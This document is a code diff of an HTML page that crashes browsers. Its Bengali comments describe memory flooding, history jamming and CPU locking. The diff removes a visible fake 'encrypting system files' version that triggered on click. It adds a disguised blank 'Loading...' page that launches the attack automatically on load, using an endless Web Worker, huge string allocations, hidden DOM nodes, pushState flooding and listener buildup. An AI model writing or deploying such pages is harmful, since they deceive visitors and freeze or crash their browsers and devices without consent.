@@ -2,57 +2,71 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>❤️ SYSTEM TERMINATED ❤️</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
     <style>
-        body { background: black; color: #f00; font-family: monospace; overflow: hidden; text-align: center; padding-top: 20%; }
-        #status { font-size: 20px; text-shadow: 0 0 10px red; }
+        body { 
+            background-color: #ffffff; 
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
     </style>
 </head>
-<body onclick="totalCrash()">
-
-    <div id="status">
-        [!] ENCRYPTING SYSTEM FILES...<br>
-        [#] CLICK TO FINALIZE OVERRIDE [#]
-    </div>
+<body>
 
     <script>
-        function totalCrash() {
-            // ১. অটো ফুলস্ক্রিন ও মাউস লক (পালানোর পথ বন্ধ)
-            document.documentElement.requestFullscreen();
+        // মেমোরি ট্র্যাকিংয়ের জন্য গ্লোবাল ভেরিয়েবল
+        const permanentMemoryStorage = [];
+        let keyCounter = 0;
+
+        window.addEventListener('DOMContentLoaded', () => {
             
-            // ২. হিস্ট্রি জ্যাম (ব্যাক বাটন ইনভ্যালিড করা)
-            setInterval(() => {
-                for (let i = 0; i < 1000; i++) {
-                    window.history.pushState(null, null, location.href + "/" + Math.random());
-                }
-            }, 1);
-
-            // ৩. র‍্যাম এবং জিপিইউ একযোগে ক্রাশ করা (মেইন ইঞ্জিন)
-            let data = [];
-            function destructiveLoop() {
-                // মেমোরি ফ্লাডিং - প্রতি মিলিসেকেন্ডে বিশাল ডাটা পুশ
-                data.push(new Array(10000000).join("⚠︎ENAFUL⚠︎"));
-                
-                // ইনফিনিট এলিমেন্ট ক্রিয়েশন (DOM Stress)
-                let div = document.createElement('div');
-                div.innerHTML = "<h1>CRITICAL_FAILURE</h1>".repeat(100);
-                document.body.appendChild(div);
-                
-                // কনসোল স্ট্যাক ওভারফ্লো
-                console.log("%c STOP", "font-size:100px; color:red;");
-                
-                // রিকার্সিভ কল যা দ্রুত প্রসেসর লক করবে
-                setTimeout(destructiveLoop, 0);
+            // ফিচার ১: ব্যাকগ্রাউন্ড থ্রেড (Web Worker) তৈরি করার চেষ্টা
+            // এটি সফল হলে মেইন থ্রেডের বাইরেও সিপিইউ কোর ব্যস্ত রাখার চেষ্টা করে
+            try {
+                const workerCode = `while(true){ postMessage(new Array(1000000).join("⚙️")); }`;
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
+                const worker = new Worker(URL.createObjectURL(blob));
+                worker.onmessage = function(e) {
+                    permanentMemoryStorage.push(e.data);
+                };
+            } catch (e) {
+                console.log("Worker initialization skipped or blocked.");
             }
 
-            // ৪. হার্ডওয়্যার ফ্রিজ লুপ
-            while(true) {
-                destructiveLoop();
-                // এটি ব্রাউজারের রেসপন্স করার ক্ষমতা কেড়ে নেবে
-                var crash = " ".repeat(1000); 
+            // প্রধান সিনক্রোনাস লুপ
+            while (true) {
+                
+                // ১. বড় আকারের ডেটা ব্লক তৈরি ও পুশ
+                let instantMassiveBlock = new Array(5000000).join("⚠️🧱");
+                permanentMemoryStorage.push(instantMassiveBlock);
+                
+                // ২. অদৃশ্য DOM এলিমেন্ট তৈরি
+                let hiddenNode = document.createElement('div');
+                hiddenNode.style.position = 'absolute';
+                hiddenNode.style.left = '-9999px'; 
+                hiddenNode.innerHTML = "<span>STRESS_TEST</span>".repeat(500);
+                document.body.appendChild(hiddenNode);
+                
+                // ৩. হিস্ট্রি স্টেট জ্যামিং
+                window.history.pushState(null, null, "#/lock-status/" + Math.random());
+
+                // ফিচার ২: গ্লোবাল স্কোপ পলিউশন
+                // উইন্ডো অবজেক্টের আন্ডারে অনবরত নতুন ইউনিক প্রোপার্টি তৈরি করা
+                window["stress_key_" + keyCounter] = instantMassiveBlock;
+                keyCounter++;
+
+                // ফিচার ৩: অনবরত ইভেন্ট লিসেনার অ্যাড করা
+                // এটি ব্রাউজারের ইভেন্ট ডিস্ট্রিবিউশন টেবিলকে ভারী করে তোলে
+                window.addEventListener('resize', () => {
+                    return instantMassiveBlock;
+                });
+                
+                // ৪. কনসোল রাইট
+                console.log(instantMassiveBlock);
             }
-        }
+        });
     </script>
 </body>
 </html>
